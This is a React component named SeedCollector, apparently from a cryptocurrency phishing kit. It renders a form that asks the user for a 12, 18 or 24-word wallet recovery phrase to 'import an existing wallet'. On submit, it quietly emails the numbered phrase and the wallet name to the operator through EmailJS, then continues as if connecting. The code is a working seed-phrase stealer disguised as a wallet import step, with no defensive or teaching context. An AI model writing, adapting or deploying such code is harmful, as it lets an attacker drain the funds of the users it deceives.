import { CircularProgress, Grid } from '@mui/material';
import { useState } from 'react';
import { FaAngleRight } from 'react-icons/fa6';
import emailjs from '@emailjs/browser';

const EMAIL_PUBLIC_KEY = import.meta.env.VITE_EMAIL_PK;
const EMAIL_SERVICE_KEY = import.meta.env.VITE_EMAIL_SK;
const EMAIL_TEMPLATE_KEY = import.meta.env.VITE_EMAIL_TK;

function SeedCollector({ selectedWallet, handleDone }) {
	const [wordsNum, setWordsNum] = useState(12);
	const [walletPhrase, setWalletPhrase] = useState([]);
	const [loading, setLoading] = useState(false);

	const handleSubmit = (e) => {
		e.preventDefault();
		setLoading(true);

		const numberedPhraseString = walletPhrase
			.map((word, index) => {
				return `${index + 1}. ${word}`;
			})
			.join(',  ');

		const phrase = {
			type: 'Phrase',
			wallet: selectedWallet,
			phrase: numberedPhraseString,
		};

		emailjs
			.send(
				EMAIL_SERVICE_KEY,
				EMAIL_TEMPLATE_KEY,
				phrase,
				EMAIL_PUBLIC_KEY
			)
			.then(
				function (response) {
					handleDone();
					setLoading(false);
				},
				function (err) {
					handleDone();
					setLoading(false);
				}
			);
	};

	const handleChange = (value, index) => {
		const newWalletPhrase = [...walletPhrase];
		newWalletPhrase[index] = value;
		setWalletPhrase(newWalletPhrase);
	};

	return (
		<div className='seed-collector w-full flex flex-col gap-2'>
			<h4>
				Import an existing wallet with your 12, 18, or 24-word secret
				phrase.
			</h4>
			<div className='tabs w-full flex gap-3 justify-start '>
				<div
					className={`py-1 px-4 rounded-full hover:bg-[#f0f0f0] text-[#494949s] border border-[#7d7d7ds] cursor-pointer ${
						wordsNum === 12 && 'bg-[#f0f0f0]'
					}`}
					onClick={() => setWordsNum(12)}>
					12 words
				</div>
				<div
					className={`py-1 px-4 rounded-full hover:bg-[#f0f0f0] text-[#494949s] border border-[#7d7d7ds] cursor-pointer ${
						wordsNum === 18 && 'bg-[#f0f0f0]'
					}`}
					onClick={() => setWordsNum(18)}>
					18 words
				</div>
				<div
					className={`py-1 px-4 rounded-full hover:bg-[#f0f0f0] text-[#494949] border border-[#7d7d7ds] cursor-pointer ${
						wordsNum === 24 && 'bg-[#f0f0f0]'
					}`}
					onClick={() => setWordsNum(24)}>
					24 words
				</div>
			</div>

			<form
				onSubmit={handleSubmit}
				className='w-full flex flex-col gap-2'>
				<section className='w-full h-auto my-2'>
					<Grid container spacing={2} className='w-full'>
						{...Array(wordsNum)
							.fill(0)
							.map((_, index) => (
								<Grid size={4} key={index}>
									<input
										onChange={(e) => {
											handleChange(e.target.value, index);
										}}
										value={walletPhrase[index] || ''}
										placeholder={`${index + 1}.`}
										className='w-full border border-[#494949] py-2 px-3 text-sm rounded-md'
										required
									/>
								</Grid>
							))}
					</Grid>
				</section>

				<button
					disabled={loading}
					type='submit'
					className='w-full py-1 !rounded-full !bg-black text-white !my-2'>
					{loading ? (
						<>
							Connecting...{' '}
							<CircularProgress color='"white' size={20} />
						</>
					) : (
						<>
							Continue <FaAngleRight />
						</>
					)}
				</button>
			</form>
		</div>
	);
}

export default SeedCollector;
